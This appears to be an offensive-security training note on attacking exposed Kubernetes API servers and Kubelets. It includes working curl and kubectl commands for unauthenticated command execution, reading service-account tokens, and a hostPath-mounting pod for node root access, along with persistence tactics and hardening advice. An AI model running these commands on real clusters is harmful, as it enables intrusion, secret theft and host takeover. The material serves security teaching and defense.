---
tags: [kubernetes, api, kubelet, rbac-bypass, token-abuse]
difficulty: expert
module: "35 - Network Protocol Attacks"
topic: "35.21 Kubernetes API"
---

# 21 - Kubernetes API: Unauthenticated Access & RBAC Bypass

## 1. Executive Summary

Kubernetes (K8s) is the de facto standard for container orchestration. It manages massive clusters of containerized applications across multiple physical or virtual hosts. Because of its distributed nature, Kubernetes relies heavily on RESTful APIs for internal component communication and external management.

The two primary targets for attackers are the **Master Node API Server (Port 6443)** and the **Worker Node Kubelet API (Port 10250)**. Misconfigurations in these APIs—specifically allowing anonymous access, or overly permissive Role-Based Access Control (RBAC) configurations—allow attackers to compromise individual pods, escalate privileges, and ultimately achieve total cluster takeover and underlying host compromise.

## 2. Protocol Overview & Architecture

To exploit Kubernetes, one must understand its components:
- **Master Node (Control Plane):** Runs the `kube-apiserver`, handling all cluster operations. It exposes a REST API (typically on TCP 6443).
- **Worker Nodes:** Run the actual containers (Pods). Each node runs an agent called the `kubelet`.
- **Kubelet API (TCP 10250):** The Kubelet exposes its own API to receive commands from the master node (e.g., "start this pod," "execute this command").
- **Service Accounts:** Every pod is provisioned with a cryptographic token allowing it to communicate with the master API server. These are mounted inside the pod at `/var/run/secrets/kubernetes.io/serviceaccount/`.

## 3. Enumeration & Footprinting

### Nmap Enumeration
```bash
# Scan for API Server and Kubelet ports
nmap -p 6443,10250,10255 -sV <Target_IP>
```

### Checking Anonymous Access
Attackers frequently check if the APIs allow anonymous, unauthenticated requests.

```bash
# Check Master API Server
curl -k https://<Target_IP>:6443/version
curl -k https://<Target_IP>:6443/api/v1/namespaces

# Check Kubelet API (Worker Node)
curl -k https://<Target_IP>:10250/pods
```
*If these commands return valid JSON configurations rather than `401 Unauthorized` or `403 Forbidden`, the cluster is critically vulnerable.*

## 4. Exploiting the Kubelet API (Unauthenticated RCE)

The Kubelet API on Port 10250 manages the containers on a specific worker node. By default, older K8s setups allowed anonymous access to the Kubelet. If anonymous access is enabled, an attacker can directly instruct the Kubelet to execute commands inside any running pod.

### Step-by-Step Kubelet Exploitation

**1. Extract Pod Information**
The attacker queries the Kubelet to find running pods, their namespaces, and container names.
```bash
curl -s -k https://<Target_IP>:10250/pods | jq '.items[] | "Namespace: \(.metadata.namespace), Pod: \(.metadata.name), Container: \(.spec.containers[0].name)"'
```

**2. Execute Commands via `/run`**
Using the undocumented Kubelet `/run` endpoint, the attacker can execute arbitrary commands inside the target container.
```bash
# Syntax: /run/<namespace>/<pod_name>/<container_name>
curl -k -X POST "https://<Target_IP>:10250/run/default/nginx-pod/nginx-container" -d "cmd=id"

# Output: uid=0(root) gid=0(root) groups=0(root)
```

**3. Extract the Service Account Token**
To escalate from the pod to the entire cluster, the attacker executes a command to steal the pod's service account token.
```bash
curl -k -X POST "https://<Target_IP>:10250/run/default/nginx-pod/nginx-container" -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
```

## 5. Exploiting the Master API: RBAC Bypass & Cluster Takeover

Once an attacker possesses a Service Account token (either stolen via Kubelet, Server-Side Request Forgery, or a web vulnerability like Command Injection inside a pod), they authenticate to the Master API Server (Port 6443).

### 5.1 RBAC Enumeration
The attacker configures `kubectl` to use the stolen token and checks their privileges.
```bash
export TOKEN="eyJhbGciOiJSUzI1NiI..."
kubectl config set-credentials attacker --token=$TOKEN
kubectl config set-context attacker-context --user=attacker --cluster=kubernetes
kubectl config use-context attacker-context

# Check permissions: What can this token do?
kubectl auth can-i --list
```

### 5.2 RBAC Exploitation (Escalating Privileges)
If the Service Account has misconfigured, overly permissive roles, the attacker can exploit them. Common dangerous permissions include:

- **Create Pods:** The attacker can deploy a malicious pod that mounts the underlying host's root filesystem (similar to Docker API exploitation).
- **Create ClusterRoles/RoleBindings:** The attacker can grant themselves cluster-admin rights.
- **Read Secrets:** The attacker can dump all K8s secrets, extracting API keys, database passwords, and other service tokens.

**Example: Exploiting 'Create Pod' for Node Takeover**
The attacker creates a `malicious-pod.yaml`:
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: host-mount-pod
spec:
  containers:
  - name: alpine
    image: alpine
    command: ["/bin/sh", "-c", "sleep 3600"]
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
```
Apply the payload:
```bash
kubectl apply -f malicious-pod.yaml
kubectl exec -it host-mount-pod -- chroot /host /bin/bash
```
*Result: Full root access to the underlying Kubernetes Worker Node.*

## 6. ASCII Architecture & Attack Diagram

```text
+-----------------------+           +---------------------------------+
|                       |  TCP      |      Kubernetes Worker Node     |
|    Attacker Box       |==========>|      Kubelet API (Port 10250)   |
|                       |           |      (Anonymous Auth Enabled)   |
+-----------------------+           +---------------------------------+
           |                                         |
           | 1. POST /run/default/pod_a/container_a  |
           |    Payload: cmd=cat /var/.../token      |
           |---------------------------------------->|
           |                                         |
           | 2. Returns JWT Service Account Token    |
           |<----------------------------------------|
           |                                         |
+-----------------------+                            |
| 3. Auth to Master API |                            |
|    using stolen Token |                            |
+-----------------------+                            |
           |                                         |
           | 4. kubectl apply (Host Mount Pod)       |
           |    Target: Master API (Port 6443)       |
           |========================================>|
                                                     |
                                                     v
                                        +-----------------------------+
                                        |  Master Node Validates RBAC |
                                        |  Deploys Malicious Pod back |
                                        |  to Worker Node             |
                                        +-----------------------------+
                                                     |
                                                     v
                                        +-----------------------------+
                                        | Attacker gets root shell on |
                                        | underlying host OS via      |
                                        | volume mount escape.        |
                                        +-----------------------------+
```

## 7. Post-Exploitation & Persistence

- **Cluster-Admin Backdoors:** Creating hidden `ClusterRoleBindings` tying the `system:anonymous` user to `cluster-admin`, ensuring persistent access even if the original service account token is rotated.
- **Sidecar Injection:** Modifying legitimate deployments to inject a malicious "sidecar" container that stealthily mines cryptocurrency or exfiltrates traffic.
- **Secret Exfiltration:** Dumping the `kube-system` namespace secrets to retrieve the cluster's CA certificates.

## 8. Defense, Mitigation, & Hardening

1. **Disable Anonymous Authentication:** Ensure the Kubelet is started with `--anonymous-auth=false`. Similarly, ensure the API Server rejects anonymous requests.
2. **Strict RBAC Enforcement:** Follow the Principle of Least Privilege. Service Accounts should only have permissions required for their specific application. Use tools like `kube-score` to audit RBAC roles.
3. **Automount Service Account Tokens:** If a pod does not need to communicate with the K8s API, disable token mounting in the Pod specification:
   ```yaml
   automountServiceAccountToken: false
   ```
4. **Pod Security Admission / OPA Gatekeeper:** Enforce policies that strictly forbid containers from running as root, using `--privileged`, or mounting sensitive `hostPath` directories (like `/` or `/var/run`).
5. **Network Policies:** Implement strict egress/ingress rules restricting which pods can communicate with the metadata server, Kubelet, or API server.

## 9. Chaining Opportunities

- **Cloud Metadata SSRF:** In cloud environments (AWS/GCP/Azure), attackers who compromise a pod will immediately attempt to query the Cloud Instance Metadata Service (IMDS) at `169.254.169.254` to steal underlying IAM node roles. See **[[07 - Server-Side Request Forgery (SSRF)]]** and Cloud exploitation notes.
- **Command Injection to Container Escape:** A standard web application vulnerability leads to pod compromise, which flows directly into RBAC enumeration. See **[[05 - Command Injection]]** and **[[20 - Docker API — Exposed Daemon, Container Escape]]**.

## 10. Related Notes
- [[20 - Docker API — Exposed Daemon, Container Escape]]
- [[08 - Linux Privilege Escalation]]
- [[07 - Server-Side Request Forgery (SSRF)]]
- [[18 - Elasticsearch — Open Access, Data Exfiltration]]
